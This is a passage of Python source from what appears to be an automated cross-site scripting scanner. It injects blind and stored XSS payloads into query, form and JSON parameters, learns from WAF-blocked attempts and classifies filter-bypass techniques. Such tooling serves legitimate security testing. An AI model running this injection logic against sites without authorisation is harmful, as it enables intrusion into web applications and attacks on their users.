                                failure_reason = self._classify_failure_reason(probe_result, waf_name)
                            self.learning_engine.record_failure(
                                payload, ctx_label, waf_name,
                                domain=url, waf_detected=bool(waf_name),
                                failure_reason=failure_reason,
                                endpoint_profile=endpoint_profile,
                                encoding_profile=encoding_profile,
                            )

            if self.blind_injector:
                blind_payloads = self.blind_injector.generate_payloads(url, param_name)
                for bp in blind_payloads:
                    if self._check_stop_pause():
                        break
                    try:
                        if param_location == 'json_body':
                            json_tmpl = copy.deepcopy(
                                param_context.get('json_body', {}) if param_context else {}
                            )
                            json_tmpl[param_name] = bp
                            api_url = (param_context or {}).get('form_action', url)
                            self.client.post_json(api_url, json_data=json_tmpl)
                        elif param_location == 'POST':
                            post_data = dict(
                                (param_context or {}).get('form_inputs', {})
                            )
                            post_data[param_name] = bp
                            form_action = (param_context or {}).get('form_action', url)
                            self.client.post(form_action, data=post_data)
                        else:
                            test_url = self._build_test_url(url, param_name, bp, param_location)
                            self.client.get(test_url)
                        with self._payloads_tested_lock:
                            self.payloads_tested += 1
                    except Exception as e:
                        if getattr(self.config, 'verbose', False):
                            import traceback
                            traceback.print_exc()

            if session:
                session.mark_tested(url, param_name, param_location)
        
        return vulnerabilities
    
    
    def check_stored_xss(self, crawled_urls: List[Dict]) -> List[Dict]:
        """Check for stored XSS by revisiting pages after payload injection"""
        if not self.config.stored_xss_enabled or not self._injected_payloads:
            return []
        
        stored_vulns = []
        checked_urls = set()
        
        for url_data in crawled_urls:
            if self._stopped:
                break
            
            url = url_data['url']
            if url in checked_urls:
                continue
            checked_urls.add(url)
            
            try:
                response = self.client.get(url, timeout=10)
                
                if not any(ct in response.headers.get('Content-Type', '').lower()
                          for ct in ['text/html', 'application/xhtml']):
                    continue
                
                body = response.text
                
                for inj in self._injected_payloads:
                    if inj['url'] == url and inj.get('location') in ('query', 'GET'):
                        continue  # Already tested as reflected XSS
                    
                    payload = inj['payload']
                    
                    inj_uid = inj.get('uid', '')
                    uid_found = inj_uid and f'data-akha-id="{inj_uid}"' in body
                    marker_found = (self.verifier.verify_class in body or self.verifier.verify_id in body) and not inj_uid
                    if (uid_found or marker_found) and self._is_payload_reflected_raw(body, payload):
                        stored_vulns.append({
                            'url': url,
                            'parameter': inj['param'],
                            'payload': payload,
                            'test_url': url,
                            'context': {'Location': 'HTML'},
                            'type': 'stored_xss',
                            'status': 'Stored XSS Detected',
                            'confidence': 90,
                            'bypass_technique': 'None',
                            'proof': f"Stored XSS: Payload injected at {inj['url']} (param: {inj['param']}) appeared at {url}",
                            'request': self._capture_full_request(response, url, 'GET'),
                            'response': self._capture_full_response(response, payload),
                            'validated': True,
                            'injection_point': inj['url'],
                            'csp': {},
                        })
                        break
            
            except Exception as e:
                if getattr(self.config, 'verbose', False):
                    import traceback
                    traceback.print_exc()
                continue
        
        return stored_vulns
    
    

    def _build_path_url(self, url: str, path_index: int, value: str) -> str:
        """Build test URL replacing a path segment at path_index with value."""
        return Injector._build_path_url(url, path_index, value)

    def _build_test_url(self, url: str, param_name: str, payload: str, location: str) -> str:
        """Build test URL with payload."""
        return Injector._build_query_url(url, param_name, payload)
    
    def _capture_full_request(self, response, url: str, location: str,
                              post_data: Optional[Dict] = None) -> str:
        """Capture full HTTP request (delegates to Injector to avoid duplication)."""
        return self.injector.capture_request(response, url, location, post_data)
    
    def _capture_full_response(self, response, payload: Optional[str] = None) -> str:
        """Capture full HTTP response (delegates to Injector to avoid duplication)."""
        return self.injector.capture_response(response, payload)
    
    def _get_bypass_technique(self, payload: str) -> str:
        """Identify bypass technique used"""
        if re.search(r'[A-Z][a-z]', payload) and re.search(r'[a-z][A-Z]', payload):
            return 'Case Variation'
        if '&#' in payload:
            return 'HTML Entity Encoding'
        if '/*' in payload or '-->' in payload:
            return 'Comment Injection'
        if '`' in payload and '(' not in payload:
            return 'Backtick Usage'
        if '</script>' in payload.lower() and '<svg' in payload.lower():
            return 'Script Break + SVG'
        return 'None'
    
    def _generate_proof(self, test_url: str, payload: str) -> str:
        """Generate proof of concept"""
        return f"Visit the following URL to trigger XSS:\n{test_url}\n\nPayload used: {payload}"
    
    def cleanup(self):
        """Deterministic cleanup of all browser resources.

        Call this **before** the process exits so Playwright subprocesses
        are torn down on the correct event loop.  ``__del__`` is kept as a
        safety net but should NOT be relied upon.
        """
        validator = getattr(self, 'validator', None)
        if validator is not None:
            try:
                validator.close()
            except Exception as exc:
                logger.debug("Validator cleanup failed", exc_info=True)
        if self.execution_verifier is not None:
            try:
                self.execution_verifier.close()
            except Exception as exc:
                logger.debug("Execution verifier cleanup failed", exc_info=True)
        if self.execution_verifier_firefox is not None:
            try:
                self.execution_verifier_firefox.close()
            except Exception as exc:
                logger.debug("Firefox execution verifier cleanup failed", exc_info=True)

    def __del__(self):
        """Best-effort GC cleanup — prefer calling cleanup() explicitly."""
        try:
            self.cleanup()
        except Exception as exc:
            logger.debug("XSSEngine __del__ cleanup failed", exc_info=True)


